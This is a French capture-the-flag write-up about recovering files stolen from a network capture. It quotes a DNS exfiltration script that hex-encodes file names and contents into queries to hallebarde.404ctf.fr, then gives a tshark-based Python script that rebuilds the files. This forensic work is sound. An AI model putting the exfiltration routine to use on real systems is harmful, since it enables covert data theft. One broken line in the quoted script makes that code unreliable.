## Un agent compromis (2/3)

### Description

Après avoir retrouvé le script ``exfiltration.py``, on nous demande de retrouver les données exfiltrées via ce script.
Le script nous montre clairement qu'il s'agit d'un exfiltration DNS :
```python
def exfiltrate_file(filename):
    dns.resolver.resolve("never-gonna-give-you-up.hallebarde.404ctf.fr")
    time.sleep(0.1)
    dns.resolver.resolve(binascii.hexlify(filename.encode()).decode() + ".hallebarde.404ctf.fr")
    content = re)
    time.sleep(0.1)
    dns.resolver.resolve("626567696E.hallebarde.404ctf.fr")
    time.sleep(0.1)
    for i in range(len(content)//32):
        hostname = content[i * 32: i * 32 + 32].decode()
        dns.resolver.resolve(hostname + ".hallebarde.404ctf.fr")
        time.sleep(0.1)
    if len(content) > (len(content)//32)*32:
        hostname = content[(len(content)//32)*32:].decode()
        dns.resolver.resolve(hostname + ".hallebarde.404ctf.fr")
        time.sleep(0.1)
    dns.resolver.resolve("656E64.hallebarde.404ctf.fr")
    time.sleep(60)
```
De plus, on peut identifier des balises indiquant le début d'un fichier, la fin du nom du fichier, et la fin du fichier.

### Solution

A partir de là, il faut lire chaque requête dns effectuée vers ``hallebarde.ctf.fr``, et reconstituer les fichiers suivant le code :
```python
import os

data = os.popen('tshark -r capture-reseau.pcapng -Y "ip.src == 192.168.122.1" -T fields -e dns.qry.name | grep hallebarde').read().split('\n')

files = {}
bool_name = False
bool_file = False
file_data = b''
curr_name = b''
for query in data:
    query = query.split('.')[0]
    if query == "never-gonna-give-you-up":
        bool_name = True
        continue
    elif query == "626567696E":
        bool_name = False
        bool_file = True
        continue
    elif query == "656E64":
        bool_file = False
        files[curr_name.decode()] = file_data
        curr_name = b''
        file_data = b''
        continue
    if bool_name:
        curr_name += bytearray.fromhex(query)
    elif bool_file:
        file_data += bytearray.fromhex(query)
    

for name in files.keys():
    open(name,'wb').write(files[name])
